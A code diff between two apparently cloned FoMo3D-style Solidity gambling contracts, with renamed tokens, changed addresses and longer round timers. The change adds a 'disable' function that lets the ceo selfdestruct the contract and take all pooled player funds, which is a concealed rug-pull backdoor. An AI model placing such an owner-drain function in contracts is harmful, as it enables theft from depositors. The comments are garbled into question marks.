@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract FoMo3Dlong at 0xc32d92e3bdf6df2ff891224e3ff9a2da0e1d6e64
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract FoMo3Dlong at 0xa661d30ed10195a946a73d299645678338807ecb
 */
 pragma solidity ^0.4.24;
 
@@ -113,18 +113,18 @@ contract FoMo3Dlong is modularLong {
     using SafeMath for *;
     using NameFilter for string;
     using F3DKeysCalcLong for uint256;
-    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xa6fd21aa986247357f404aa37a7bc90809da1ad8);
+    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xc873e3646534b2253f324ee7f5f7f5b2a857ba9a);
 
 
     address public ceo;
     address public cfo; 
-    string constant public name = "Must Be Hit 4D";
-    string constant public symbol = "MBT4D";
+    string constant public name = "The Winner Fomo3D Long";
+    string constant public symbol = "THEWINNER3D";
     uint256 private rndExtra_ = 30 seconds;       
     uint256 private rndGap_ = 30 seconds;         
-    uint256 constant private rndInit_ = 1 hours;                // ????
+    uint256 constant private rndInit_ = 24 hours;                // ????
     uint256 constant private rndInc_ = 30 seconds;              // ?????KEY??
-    uint256 constant private rndMax_ = 12 hours;                // ???????
+    uint256 constant private rndMax_ = 24 hours;                // ???????
 
     uint256 public airDropPot_;             // ??
     uint256 public airDropTracker_ = 0;     
@@ -174,6 +174,7 @@ contract FoMo3Dlong is modularLong {
 
     modifier isHuman() {
         address _addr = msg.sender;
+        require (_addr == tx.origin);
         uint256 _codeLength;
         
         assembly {_codeLength := extcodesize(_addr)}
@@ -1129,6 +1130,13 @@ contract FoMo3Dlong is modularLong {
         rID_ = 1;
         round_[1].strt = now + rndExtra_ - rndGap_;
         round_[1].end = now + rndInit_ + rndExtra_;
+    }
+    
+    function disable()
+        public
+    {
+        require( msg.sender == ceo, "ONLY ceo" );
+        selfdestruct(ceo);
     }
 }
 
